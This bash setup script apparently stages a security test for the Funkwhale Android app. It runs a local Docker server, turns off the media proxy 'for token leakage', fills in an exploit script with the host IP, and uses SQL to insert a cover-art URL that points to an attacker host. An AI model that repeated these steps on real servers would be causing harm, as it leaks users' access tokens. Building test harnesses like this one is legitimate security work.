#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../utils/android.sh"
APK_PATH=$(parse_apk_path "$SCRIPT_DIR" "funkwhale" "$@")
cd "$SCRIPT_DIR"

TARGET_PACKAGE="audio.funkwhale.ffa"

setup_server(){
    log_info "Setting up local Funkwhale server with Docker"

    local server_dir="$SCRIPT_DIR/funkwhale-server"
    cd "$server_dir"

    log_info "Configuring Funkwhale server"

    mkdir -p "$server_dir/data/music" "$server_dir/data/static" "$server_dir/data/media"

    log_info "Generating .env from template..."
    sed "s|__SERVER_DIR__|$server_dir|g" .env.template > .env
    chmod 600 .env

    # Disable media proxy so cover art URLs redirect to external URLs
    # instead of being proxied server-side (needed for token leakage vulnerability)
    echo "PROXY_MEDIA=false" >> .env

    SNAPSHOT_FILE="$server_dir/postgres-snapshot1017.tar.gz"
    VOLUME_NAME="funkwhale-server_postgres_data"

    if docker volume inspect "$VOLUME_NAME" >/dev/null 2>&1; then
        log_info "Postgres volume already exists, will use existing data"
    elif [[ -f "$SNAPSHOT_FILE" ]]; then
        log_info "Restoring database from snapshot using postgres container..."

        docker compose run --rm --no-deps \
            -v "${SNAPSHOT_FILE}:/snapshot.tar.gz:ro" \
            postgres sh -c \
            "cd /var/lib/postgresql/data && tar -xzf /snapshot.tar.gz --strip-components=1" || \
            fatal "Failed to restore database snapshot"

        log_info "Database snapshot restored to volume"
    else
        fatal "No database snapshot found at $SNAPSHOT_FILE. Please create a snapshot first."
    fi

    log_info "Pulling Docker images..."
    docker compose pull || fatal "Failed to pull Docker images"

    log_info "Starting all Funkwhale services on shared_net..."
    docker compose up -d --wait || fatal "Failed to start services or healthchecks failed"

    log_info "Database services are healthy, waiting for API and frontend to start..."

    log_info "Funkwhale server setup completed"
    log_info "API available at https://localhost/api/v1/ (HTTPS)"
    log_info "Web interface at https://localhost (HTTPS)"
}

configure_exploit_host_ip() {
    log_info "Configuring exploit scripts with host IP"

    local host_ip
    host_ip=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1)

    if [[ -z "$host_ip" ]]; then
        log_warn "Could not detect host IP, exploit may not work"
        return
    fi

    log_info "Detected host IP: $host_ip"

    local exploit_script="${SCRIPT_DIR}/synthetic_vulnerabilities/vuln_1/exploit_files/exploit.sh"
    if [[ -f "$exploit_script" ]]; then
        sed -i.bak "s/HOST_IP_PLACEHOLDER/$host_ip/g" "$exploit_script"
        rm -f "${exploit_script}.bak"
        log_info "Updated exploit script with host IP: $host_ip"
    else
        log_warn "Exploit script not found at $exploit_script"
    fi
}

inject_malicious_cover_art() {
    log_info "Injecting malicious cover art URL into database..."

    local host_ip
    host_ip=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1)

    if [[ -z "$host_ip" ]]; then
        log_warn "Could not detect host IP, skipping cover art injection"
        return
    fi

    local malicious_url="http://${host_ip}:8082/malicious.png"

    local server_dir="$SCRIPT_DIR/funkwhale-server"
    cd "$server_dir"

    # Create a malicious attachment and link it to the first album
    local inject_sql="
    DO \$\$
    DECLARE
        new_attachment_id INTEGER;
        target_album_id INTEGER;
    BEGIN
        SELECT id INTO target_album_id FROM music_album ORDER BY id LIMIT 1;
        IF target_album_id IS NULL THEN
            RAISE NOTICE 'No albums found, skipping cover art injection';
            RETURN;
        END IF;

        INSERT INTO common_attachment (uuid, url, mimetype, creation_date, size, file)
        VALUES (gen_random_uuid(), '${malicious_url}', 'image/png', NOW(), 0, '')
        RETURNING id INTO new_attachment_id;

        UPDATE music_album SET attachment_cover_id = new_attachment_id WHERE id = target_album_id;

        RAISE NOTICE 'Injected malicious cover art (attachment=%, album=%)', new_attachment_id, target_album_id;
    END \$\$;
    "

    docker compose exec -T postgres psql -U funkwhale -d funkwhale -c "$inject_sql" || \
        log_warn "Failed to inject malicious cover art"

    log_info "Malicious cover art injection completed"
}

main(){
    log_info "Starting Funkwhale server + app setup"
    setup_server

    adb_install_apk "$APK_PATH"

    configure_exploit_host_ip
    inject_malicious_cover_art

    log_info "Funkwhale server + app setup completed successfully!"
}

main "$@"
